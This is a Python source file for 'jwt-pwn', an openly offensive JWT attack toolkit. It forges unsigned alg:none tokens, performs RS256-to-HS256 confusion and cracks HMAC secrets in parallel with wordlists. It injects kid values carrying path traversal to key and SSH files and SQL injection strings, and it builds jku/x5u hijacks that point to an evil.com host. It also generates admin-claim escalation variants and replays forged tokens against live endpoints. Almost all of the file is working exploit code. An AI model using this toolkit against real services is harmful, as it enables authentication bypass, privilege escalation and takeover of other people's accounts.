#!/usr/bin/env python3
"""
jwt-pwn — JWT vulnerability scanner and attack toolkit

Detects and exploits common JWT vulnerabilities:
  - alg:none attack (CVE class: signature bypass)
  - RS256→HS256 algorithm confusion attack
  - Weak HMAC secret brute-force (wordlist, parallel)
  - Claim tampering (exp, iat, sub, role, admin, iss)
  - Kid injection (path traversal, SQL injection payloads, 15+ paths)
  - jku/x5u header injection (JWK Set URL hijacking)
  - Privilege escalation claim variants
  - Batch mode (multiple tokens from file)
  - Live token validation against HTTP endpoints
"""

import base64
import hashlib
import hmac
import json
import sys
import argparse
import time
import os
import urllib.request
import urllib.error
import concurrent.futures
from typing import Optional


# ─── Base64url helpers ────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "_").rstrip("=")


# ─── JWT decode ───────────────────────────────────────────────────────────────

def decode_jwt(token: str) -> tuple[dict, dict, bytes]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"Expected 3 JWT parts, got {len(parts)}")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig     = b64url_decode(parts[2])
    return header, payload, sig


def encode_jwt(header: dict, payload: dict, secret: Optional[str] = None) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    alg = header.get("alg", "none").upper()
    if alg == "NONE" or secret is None:
        return f"{h}.{p}."

    hmac_algos = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    if alg not in hmac_algos:
        raise ValueError(f"Cannot sign with alg={alg} (only HS256/384/512 or none)")

    sig = hmac.new(secret.encode(), signing_input, hmac_algos[alg]).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


# ─── Attacks (original) ───────────────────────────────────────────────────────

def attack_alg_none(token: str) -> list[dict]:
    """Strip signature, set alg to none — bypasses signature verification."""
    header, payload, _ = decode_jwt(token)
    results = []
    for alg_val in ("none", "None", "NONE", "nOnE"):
        h = dict(header, alg=alg_val)
        forged = encode_jwt(h, payload)
        results.append({"attack": "alg:none", "alg_value": alg_val, "token": forged})
    return results


def attack_rs256_hs256(token: str, public_key_pem: str) -> dict:
    """
    Algorithm confusion: sign with HS256 using the RSA public key as the HMAC secret.
    Vulnerable servers accepting RS256 may verify HS256 tokens using the public key.
    """
    header, payload, _ = decode_jwt(token)
    h = dict(header, alg="HS256")
    secret = public_key_pem.strip()
    forged = encode_jwt(h, payload, secret=secret)
    return {"attack": "RS256->HS256 confusion", "token": forged}


def attack_claim_tamper(token: str, secret: Optional[str], patches: dict) -> dict:
    """Modify payload claims and re-sign (or unsign if no secret)."""
    header, payload, _ = decode_jwt(token)
    payload.update(patches)
    if "exp" in patches and patches["exp"] == "+9999d":
        payload["exp"] = int(time.time()) + 9999 * 86400
    if "iat" in patches and patches["iat"] == "now":
        payload["iat"] = int(time.time())
    forged = encode_jwt(header, payload, secret=secret)
    return {"attack": "claim_tamper", "patches": patches, "token": forged}


def attack_kid_injection(token: str, secret: Optional[str], payload_type: str) -> dict:
    """
    Inject malicious 'kid' header values:
      - path_traversal: load /dev/null as key -> empty HMAC secret
      - sql_injection: classic SQLi in kid field
    """
    header, payload, _ = decode_jwt(token)
    payloads = {
        "path_traversal": "../../../../dev/null",
        "sql_injection":  "' UNION SELECT 'attacker_key' -- -",
        "null_byte":      "key\x00.pem",
    }
    kid_val = payloads.get(payload_type, payload_type)
    h = dict(header, kid=kid_val)
    # For path_traversal: /dev/null -> empty key -> sign with empty secret
    if payload_type == "path_traversal":
        secret = ""
    forged = encode_jwt(h, payload, secret=secret)
    return {"attack": f"kid_injection:{payload_type}", "kid": kid_val, "token": forged}


def brute_hmac(token: str, wordlist_path: str) -> Optional[dict]:
    """Try wordlist to recover HMAC secret (single-threaded)."""
    header, payload, sig = decode_jwt(token)
    alg = header.get("alg", "").upper()
    hmac_algos = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in hmac_algos:
        print(f"[!] alg={alg} is not HMAC-based — brute force not applicable")
        return None

    parts = token.strip().split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    hash_fn = hmac_algos[alg]

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as fh:
            for i, line in enumerate(fh):
                candidate = line.strip()
                if not candidate:
                    continue
                test_sig = hmac.new(candidate.encode(), signing_input, hash_fn).digest()
                if hmac.compare_digest(test_sig, sig):
                    return {"attack": "brute_force", "secret": candidate, "line": i + 1}
                if i % 100000 == 0 and i > 0:
                    print(f"  [brute] {i:,} candidates tried...", file=sys.stderr)
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}", file=sys.stderr)
    return None


# ─── NEW: jku / x5u Injection ─────────────────────────────────────────────────

def _make_example_jwk_set(kid: str = "attacker-key") -> dict:
    """
    Generate a minimal example JWK Set JSON structure the attacker would host.
    Uses a dummy symmetric key (oct) so it can be constructed without crypto libs.
    Replace n/e with real RSA public key values for RS256 targets.
    """
    # Dummy RSA-like JWK (public key fields only — attacker controls the private key)
    dummy_n = b64url_encode(b"\xff" * 256)  # 2048-bit placeholder modulus
    dummy_e = b64url_encode((65537).to_bytes(3, "big"))
    return {
        "keys": [
            {
                "kty": "RSA",
                "use": "sig",
                "alg": "RS256",
                "kid": kid,
                "n": dummy_n,
                "e": dummy_e,
            },
            {
                "kty": "oct",
                "use": "sig",
                "alg": "HS256",
                "kid": kid + "-hs",
                "k": b64url_encode(b"attacker_controlled_secret_key_32b"),
            },
        ]
    }


def attack_jku_injection(token: str, attacker_url: str) -> dict:
    """
    Replace/inject the 'jku' (JWK Set URL) header to point at an attacker-controlled server.
    A vulnerable server will fetch the JWK Set from the attacker URL and use it to verify
    the signature — allowing the attacker to forge any claims.

    Returns forged token + example JWK Set JSON to host at attacker_url.
    """
    header, payload, _ = decode_jwt(token)
    kid = header.get("kid", "attacker-key")
    h = dict(header)
    h["jku"] = attacker_url
    # Keep kid consistent with the JWK Set we'll provide
    h["kid"] = kid
    # Sign with empty secret to demonstrate bypass (replace with real attacker key for full exploit)
    h_no_jku = {k: v for k, v in h.items() if k != "jku"}
    forged_unsigned = encode_jwt(h, payload, secret=None)
    example_jwks = _make_example_jwk_set(kid=kid)

    return {
        "attack": "jku_injection",
        "jku_url": attacker_url,
        "kid": kid,
        "token": forged_unsigned,
        "instructions": (
            f"1. Host the 'jwks_to_host' JSON at: {attacker_url}\n"
            "2. Generate an RSA key pair (e.g. openssl genrsa -out priv.pem 2048)\n"
            "3. Extract public key values (n, e) and update 'jwks_to_host'\n"
            "4. Sign the token header+payload with your RSA private key\n"
            "5. Replace the token signature with your RS256 signature\n"
            "   The server will fetch your JWK Set and verify against your public key"
        ),
        "jwks_to_host": example_jwks,
    }


def attack_x5u_injection(token: str, attacker_url: str) -> dict:
    """
    Replace/inject the 'x5u' (X.509 URL) header to point at an attacker-controlled certificate.
    A vulnerable server will fetch the certificate from the attacker URL and use it to verify
    the token signature — allowing the attacker to forge any claims.

    Returns forged token + instructions for hosting a self-signed certificate.
    """
    header, payload, _ = decode_jwt(token)
    h = dict(header)
    h["x5u"] = attacker_url
    forged_unsigned = encode_jwt(h, payload, secret=None)

    return {
        "attack": "x5u_injection",
        "x5u_url": attacker_url,
        "token": forged_unsigned,
        "instructions": (
            f"1. Generate a self-signed certificate:\n"
            "   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n"
            "2. Convert cert to DER, then base64url-encode it\n"
            f"3. Host cert.pem (PEM) or the X.509 DER at: {attacker_url}\n"
            "4. Sign the token with the corresponding private key (key.pem)\n"
            "5. Server fetches x5u, extracts public key, verifies your forged signature"
        ),
        "example_openssl_commands": [
            "openssl req -x509 -newkey rsa:2048 -keyout attacker_key.pem -out attacker_cert.pem -days 365 -nodes -subj '/CN=attacker'",
            "python3 -m http.server 8080  # serve attacker_cert.pem at attacker_url",
        ],
    }


# ─── NEW: kid_paths — Extended kid injection with 15+ paths ───────────────────

def attack_kid_paths(token: str, secret: Optional[str] = None) -> list[dict]:
    """
    Extended kid injection: enumerate 15+ path/SQL/null-byte variants.
    Each variant uses a different kid value; path-based ones sign with empty secret,
    SQL-based ones sign with the SQL-injected value as secret (for HS256 targets),
    custom paths sign with provided secret or empty.
    """
    header, payload, _ = decode_jwt(token)

    path_variants = [
        # Classic null-device (empty key)
        ("/dev/null",                          ""),
        ("../../../../dev/null",               ""),
        # Process file descriptors (Linux)
        ("/proc/self/fd/0",                    ""),
        ("/proc/self/environ",                 ""),
        # Common key file locations
        ("/etc/ssl/private/server.key",        secret or ""),
        ("/etc/ssl/private/ssl-cert-snakeoil.key", secret or ""),
        ("/etc/ssl/certs/ca-certificates.crt", secret or ""),
        ("/app/keys/private.pem",              secret or ""),
        ("/app/config/secret.key",             secret or ""),
        ("/var/www/html/key.pem",              secret or ""),
        ("/home/app/.ssh/id_rsa",              secret or ""),
        ("/root/.ssh/id_rsa",                  secret or ""),
        ("/tmp/key.pem",                       secret or ""),
        # Null-byte tricks (terminate path early)
        ("/dev/null\x00",                      ""),
        ("keys/secret\x00.json",              ""),
    ]

    sql_variants = [
        # MySQL / MariaDB
        ("' UNION SELECT 'secret'-- -",       "secret"),
        ("' UNION SELECT 'secret',NULL-- -",  "secret"),
        ("x' OR '1'='1",                      secret or ""),
        # MSSQL
        ("'; SELECT 'secret'--",              "secret"),
        ("x'; WAITFOR DELAY '0:0:5'--",       secret or ""),
        # PostgreSQL
        ("' UNION SELECT 'secret'::text--",   "secret"),
        # Generic
        ("1 OR 1=1",                          secret or ""),
        ("../keys/' UNION SELECT NULL--",     secret or ""),
    ]

    results = []

    for kid_val, sign_secret in path_variants:
        h = dict(header, kid=kid_val)
        try:
            forged = encode_jwt(h, payload, secret=sign_secret if header.get("alg", "none").upper() != "NONE" else None)
        except ValueError:
            forged = encode_jwt(h, payload, secret=None)
        results.append({
            "attack": "kid_path_enum",
            "variant": "path",
            "kid": kid_val,
            "sign_secret": repr(sign_secret),
            "token": forged,
        })

    for kid_val, sign_secret in sql_variants:
        h = dict(header, kid=kid_val)
        try:
            forged = encode_jwt(h, payload, secret=sign_secret if header.get("alg", "none").upper() != "NONE" else None)
        except ValueError:
            forged = encode_jwt(h, payload, secret=None)
        results.append({
            "attack": "kid_path_enum",
            "variant": "sql",
            "kid": kid_val,
            "sign_secret": repr(sign_secret),
            "token": forged,
        })

    return results


# ─── NEW: Parallel brute-force ─────────────────────────────────────────────────

def _chunk_worker(args_tuple):
    """
    Worker function for parallel brute-force.
    Receives (signing_input_b64, sig_hex, alg, candidates) tuple.
    Returns the found secret or None.
    """
    signing_input_b64, sig_hex, alg, candidates = args_tuple
    signing_input = base64.b64decode(signing_input_b64)
    sig = bytes.fromhex(sig_hex)
    hmac_algos = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = hmac_algos[alg]
    for candidate in candidates:
        test_sig = hmac.new(candidate.encode(), signing_input, hash_fn).digest()
        if hmac.compare_digest(test_sig, sig):
            return candidate
    return None


def brute_hmac_parallel(token: str, wordlist_path: str, workers: int = 4) -> Optional[dict]:
    """
    Parallel brute-force using ProcessPoolExecutor.
    Chunks the wordlist across workers; reports progress every ~5 seconds.
    Returns result dict on first hit, None if not found.
    """
    header, payload, sig = decode_jwt(token)
    alg = header.get("alg", "").upper()
    hmac_algos = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in hmac_algos:
        print(f"[!] alg={alg} is not HMAC-based — brute force not applicable", file=sys.stderr)
        return None

    parts = token.strip().split(".")
    signing_input_bytes = f"{parts[0]}.{parts[1]}".encode()
    # Serialize for pickling across processes
    signing_input_b64 = base64.b64encode(signing_input_bytes).decode()
    sig_hex = sig.hex()

    try:
        fh = open(wordlist_path, "r", encoding="utf-8", errors="ignore")
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}", file=sys.stderr)
        return None

    chunk_size = 10000
    total_tried = 0
    start_time = time.time()
    last_report = start_time
    result = None

    with concurrent.futures.ProcessPoolExecutor(max_workers=workers) as executor:
        futures = {}
        chunk = []
        exhausted = False

        while not exhausted or futures:
            # Fill up to workers*2 pending futures
            while not exhausted and len(futures) < workers * 2:
                for line in fh:
                    candidate = line.strip()
                    if candidate:
                        chunk.append(candidate)
                    if len(chunk) >= chunk_size:
                        break
                else:
                    exhausted = True

                if chunk:
                    fut = executor.submit(_chunk_worker, (signing_input_b64, sig_hex, alg, chunk))
                    futures[fut] = len(chunk)
                    chunk = []
                else:
                    exhausted = True
                    break

            if not futures:
                break

            done, _ = concurrent.futures.wait(
                list(futures.keys()),
                timeout=1.0,
                return_when=concurrent.futures.FIRST_COMPLETED,
            )

            for fut in done:
                count = futures.pop(fut)
                total_tried += count
                found = fut.result()
                if found is not None:
                    result = {"attack": "brute_force_parallel", "secret": found, "candidates_tried": total_tried}
                    # Cancel remaining futures
                    for remaining in list(futures.keys()):
                        remaining.cancel()
                    futures.clear()
                    exhausted = True
                    break

            now = time.time()
            if now - last_report >= 5.0:
                elapsed = now - start_time
                rate = total_tried / elapsed if elapsed > 0 else 0
                print(f"  [brute-parallel] {total_tried:,} tried, {rate:.0f}/s, {workers} workers", file=sys.stderr)
                last_report = now

            if result:
                break

    fh.close()

    if result is None:
        elapsed = time.time() - start_time
        print(f"[!] Secret not found. Tried {total_tried:,} candidates in {elapsed:.1f}s", file=sys.stderr)

    return result


# ─── NEW: Claim escalation — auto-generate privilege escalation variants ───────

def attack_claim_escalation(token: str, secret: Optional[str] = None) -> list[dict]:
    """
    Auto-generate privilege escalation variants by trying all common admin claim patterns.
    Each variant patches one or more claims; tokens are signed with the provided secret
    (or left unsigned if secret is None).
    """
    header, payload, _ = decode_jwt(token)
    now = int(time.time())

    escalation_patches = [
        {"role": "admin"},
        {"role": "superadmin"},
        {"admin": True},
        {"is_admin": True},
        {"permission": "admin"},
        {"scope": "admin:*"},
        {"group": "administrators"},
        {"access_level": 10},
        {"tier": "premium"},
        {"user_type": "admin"},
        # Extended expiry (+10 years)
        {"exp": now + 10 * 365 * 86400},
        # Set sub to admin
        {"sub": "admin"},
        # Combination: role + exp
        {"role": "admin", "exp": now + 10 * 365 * 86400},
        # Root / superuser patterns
        {"role": "root"},
        {"privileges": ["read", "write", "admin", "superuser"]},
        {"roles": ["admin", "superadmin"]},
        # iat reset (appear freshly issued)
        {"iat": now, "exp": now + 10 * 365 * 86400},
        # nbf in the past
        {"nbf": now - 9999 * 86400},
        # issuer confusion
        {"iss": "admin"},
        # JWT ID reset
        {"jti": "00000000-0000-0000-0000-000000000000"},
    ]

    results = []
    for patches in escalation_patches:
        patched_payload = dict(payload)
        patched_payload.update(patches)
        try:
            forged = encode_jwt(header, patched_payload, secret=secret)
        except ValueError:
            forged = encode_jwt(dict(header, alg="none"), patched_payload, secret=None)
        results.append({
            "attack": "claim_escalation",
            "patches": patches,
            "token": forged,
        })

    return results


# ─── NEW: validate_token — test forged token against live endpoint ─────────────

def validate_token(
    token: str,
    url: str,
    method: str = "GET",
    header: str = "Authorization",
    prefix: str = "Bearer ",
) -> tuple[int, int, dict]:
    """
    Test a forged token against a live endpoint.
    Sends an HTTP request with the token in the specified header.
    Returns (status_code, response_length, response_headers).
    """
    req = urllib.request.Request(url, method=method)
    req.add_header(header, f"{prefix}{token}")
    req.add_header("User-Agent", "jwt-pwn/2.0")

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read()
            return resp.status, len(body), dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, len(body), dict(e.headers)
    except urllib.error.URLError as e:
        print(f"  [validate] Connection error for {url}: {e.reason}", file=sys.stderr)
        return 0, 0, {}
    except Exception as e:
        print(f"  [validate] Unexpected error: {e}", file=sys.stderr)
        return 0, 0, {}


# ─── Output helpers ───────────────────────────────────────────────────────────

def print_decoded(token: str) -> None:
    header, payload, sig = decode_jwt(token)
    print("\n-- Header ------------------------------------------")
    print(json.dumps(header, indent=2))
    print("-- Payload -----------------------------------------")
    print(json.dumps(payload, indent=2))
    now = int(time.time())
    if "exp" in payload:
        delta = payload["exp"] - now
        if delta < 0:
            print(f"  [!] EXPIRED {-delta}s ago")
        else:
            print(f"  [+] expires in {delta}s")
    print(f"-- Signature ({len(sig)} bytes) ---------------------")
    print(sig.hex())


def _print_results(results: list[dict]) -> None:
    for r in results:
        print(f"\n[+] {r.get('attack')}")
        for k, v in r.items():
            if k == "attack":
                continue
            if k == "jwks_to_host":
                print(f"    {k}: {json.dumps(v, indent=6)}")
            elif isinstance(v, (dict, list)):
                print(f"    {k}: {json.dumps(v)}")
            else:
                print(f"    {k}: {v}")


def _run_all_attacks(token: str, args, test_url: Optional[str] = None) -> list[dict]:
    """Run all requested attacks on a single token; optionally validate results."""
    results = []

    if args.alg_none:
        results.extend(attack_alg_none(token))

    if args.rs256_hs256:
        with open(args.rs256_hs256) as f:
            pem = f.read()
        results.append(attack_rs256_hs256(token, pem))

    if args.tamper:
        patches = json.loads(args.tamper)
        results.append(attack_claim_tamper(token, args.secret, patches))

    if args.kid:
        results.append(attack_kid_injection(token, args.secret, args.kid))

    if getattr(args, "attack", None):
        atk = args.attack

        if atk == "jku":
            if not getattr(args, "attacker_url", None):
                print("[!] --attack jku requires --attacker-url", file=sys.stderr)
            else:
                results.append(attack_jku_injection(token, args.attacker_url))

        elif atk == "x5u":
            if not getattr(args, "attacker_url", None):
                print("[!] --attack x5u requires --attacker-url", file=sys.stderr)
            else:
                results.append(attack_x5u_injection(token, args.attacker_url))

        elif atk == "kid_paths":
            results.extend(attack_kid_paths(token, secret=args.secret))

        elif atk == "escalate":
            results.extend(attack_claim_escalation(token, secret=args.secret))

    if args.brute:
        print(f"[*] Brute-forcing {args.brute} (single-threaded)...", file=sys.stderr)
        found = brute_hmac(token, args.brute)
        if found:
            results.append(found)
        else:
            print("[!] Secret not found in wordlist", file=sys.stderr)

    if getattr(args, "brute_parallel", None):
        workers = getattr(args, "workers", 4)
        print(f"[*] Parallel brute-force {args.brute_parallel} ({workers} workers)...", file=sys.stderr)
        found = brute_hmac_parallel(token, args.brute_parallel, workers=workers)
        if found:
            results.append(found)

    # Optional live validation
    if test_url and results:
        for r in results:
            forged_token = r.get("token")
            if not forged_token:
                continue
            status, length, headers = validate_token(forged_token, test_url)
            r["test_url"] = test_url
            r["http_status"] = status
            r["response_length"] = length
            r["authenticated"] = status in (200, 201, 202, 204, 301, 302)

    return results


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="JWT vulnerability scanner and attack toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Decode and inspect a JWT
  python jwt_pwn.py --decode eyJ...

  # Try alg:none attack
  python jwt_pwn.py --token eyJ... --alg-none

  # RS256->HS256 confusion with public key file
  python jwt_pwn.py --token eyJ... --rs256-hs256 pubkey.pem

  # Tamper claims (re-sign with known secret)
  python jwt_pwn.py --token eyJ... --tamper '{"role":"admin","exp":"+9999d"}' --secret mysecret

  # kid path traversal (sign with empty string)
  python jwt_pwn.py --token eyJ... --kid path_traversal

  # Brute-force HMAC secret
  python jwt_pwn.py --token eyJ... --brute /usr/share/wordlists/rockyou.txt

  # Parallel brute-force (8 workers)
  python jwt_pwn.py --token eyJ... --brute-parallel /usr/share/wordlists/rockyou.txt --workers 8

  # jku injection (JWK Set URL hijack)
  python jwt_pwn.py --token eyJ... --attack jku --attacker-url http://evil.com/jwks.json

  # x5u injection (X.509 URL hijack)
  python jwt_pwn.py --token eyJ... --attack x5u --attacker-url http://evil.com/cert.pem

  # Extended kid path enumeration (15+ variants)
  python jwt_pwn.py --token eyJ... --attack kid_paths

  # Auto privilege escalation variants
  python jwt_pwn.py --token eyJ... --attack escalate --secret known_secret

  # Test forged tokens against live endpoint
  python jwt_pwn.py --token eyJ... --attack escalate --test-url https://api.example.com/profile

  # Batch mode: run all attacks on multiple tokens from file
  python jwt_pwn.py --batch tokens.txt --attack escalate --json
""",
    )
    parser.add_argument("--token", metavar="JWT")
    parser.add_argument("--decode", metavar="JWT", help="Decode and print JWT fields")
    parser.add_argument("--alg-none", action="store_true", help="alg:none signature bypass")
    parser.add_argument("--rs256-hs256", metavar="PUBKEY_PEM", help="RS256->HS256 confusion attack")
    parser.add_argument("--tamper", metavar="JSON", help='Claim patches as JSON e.g. \'{"role":"admin"}\'')
    parser.add_argument("--secret", metavar="SECRET", help="HMAC secret for re-signing")
    parser.add_argument("--kid", metavar="TYPE",
                        choices=["path_traversal", "sql_injection", "null_byte"],
                        help="kid header injection type")
    parser.add_argument("--brute", metavar="WORDLIST", help="Brute-force HMAC secret from wordlist (single-threaded)")
    parser.add_argument("--brute-parallel", metavar="WORDLIST",
                        help="Parallel brute-force using ProcessPoolExecutor")
    parser.add_argument("--workers", type=int, default=4,
                        help="Number of worker processes for --brute-parallel (default: 4)")
    parser.add_argument("--attack", metavar="TYPE",
                        choices=["jku", "x5u", "kid_paths", "escalate"],
                        help="Extended attack type: jku, x5u, kid_paths, escalate")
    parser.add_argument("--attacker-url", metavar="URL",
                        help="Attacker-controlled URL for jku/x5u injection")
    parser.add_argument("--test-url", metavar="URL",
                        help="Test forged tokens against this live endpoint (GET by default)")
    parser.add_argument("--test-method", metavar="METHOD", default="GET",
                        help="HTTP method for --test-url (default: GET)")
    parser.add_argument("--test-header", metavar="HEADER", default="Authorization",
                        help="HTTP header name for token (default: Authorization)")
    parser.add_argument("--test-prefix", metavar="PREFIX", default="Bearer ",
                        help="Token prefix in header value (default: 'Bearer ')")
    parser.add_argument("--batch", metavar="FILE",
                        help="Read one JWT per line from FILE and run all attacks on each")
    parser.add_argument("--json", action="store_true", dest="json_out", help="Output results as JSON")
    args = parser.parse_args()

    if args.decode:
        print_decoded(args.decode)
        return

    test_url = getattr(args, "test_url", None)

    # ── Batch mode ───────────────────────────────────────────────────────────
    if args.batch:
        try:
            with open(args.batch, "r", encoding="utf-8", errors="ignore") as bfh:
                tokens = [line.strip() for line in bfh if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print(f"[!] Batch file not found: {args.batch}", file=sys.stderr)
            sys.exit(1)

        print(f"[*] Batch mode: {len(tokens)} token(s) loaded from {args.batch}", file=sys.stderr)
        all_batch_results = {}

        for idx, tok in enumerate(tokens, 1):
            print(f"\n[*] Token {idx}/{len(tokens)}: {tok[:40]}...", file=sys.stderr)
            try:
                results = _run_all_attacks(tok, args, test_url=test_url)
            except Exception as e:
                print(f"  [!] Error processing token {idx}: {e}", file=sys.stderr)
                results = [{"error": str(e)}]

            token_key = f"token_{idx}"
            all_batch_results[token_key] = {
                "token_preview": tok[:60] + ("..." if len(tok) > 60 else ""),
                "results": results,
            }

            if not args.json_out:
                print(f"\n=== Token {idx} results ({len(results)} attacks) ===")
                _print_results(results)

        if args.json_out:
            print(json.dumps(all_batch_results, indent=2))
        return

    # ── Single token mode ─────────────────────────────────────────────────────
    if not args.token:
        parser.print_help()
        sys.exit(0)

    results = _run_all_attacks(args.token, args, test_url=test_url)

    if not results:
        print_decoded(args.token)
        return

    if args.json_out:
        print(json.dumps(results, indent=2))
    else:
        _print_results(results)


if __name__ == "__main__":
    main()
